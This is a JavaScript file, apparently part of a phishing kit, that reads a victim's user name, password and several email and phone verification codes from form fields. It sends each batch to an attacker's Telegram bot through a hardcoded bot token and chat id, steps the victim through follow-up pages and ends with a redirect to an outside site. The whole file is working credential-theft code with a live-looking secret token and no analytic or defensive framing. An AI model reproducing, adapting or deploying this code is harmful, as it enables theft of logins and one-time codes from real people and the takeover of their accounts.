//bot token
var telegram_bot_id = "8031651648:AAFckj-kgtUsRBpBCEzxnYdLppn4oOv-oss";
//chat id
var chat_id = 1477706572;
var USER, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;

var ready = function () {
    US = document.getElementById("re-us").value;
    CL = document.getElementById("re-cl").value;
    ip2 = document.getElementById("address").innerHTML;
    message =  "💲💲💲💲Hey Activo💲💲💲💲\nUSER: "+ US + "\nClv: " + CL + "\n" + ip2;
    localStorage.setItem("US", US);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index2.html"
    });
    return false;
}

var ready1 = function () {
    US = localStorage.getItem("US");
    CDM = document.getElementById("re-cdm").value;
    CDC = document.getElementById("re-cdc").value;
    message = "\nCoD Mail: " + CDM + "\nCoD Cel: " + CDC +"\nUSER: " + US; localStorage.setItem("US", US);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index3.html"
    });
    return false;
}


var ready2 = function () {
    US = localStorage.getItem("US");
    CDM2 = document.getElementById("re-cdm2").value;
	CDC2 = document.getElementById("re-cdc2").value;
    message = "🔑CoD Mail2: " + CDM2 + "🔑CoD Cel2: " + CDC2 +"\nUSER: " + US; localStorage.setItem("US", US);
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index3.html"
    });
    return false;
}

var ready3 = function () {
    CL = localStorage.getItem("CL");
    TK2 = document.getElementById("re-tk2").value;
    message = "🔑CoD2: " + TK2 + "\n📱NumCEL: " + CL; localStorage.setItem("CL", CL);
};
var sender3 = function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="https://mx-copeler.at.ua/"
    });
    return false;
}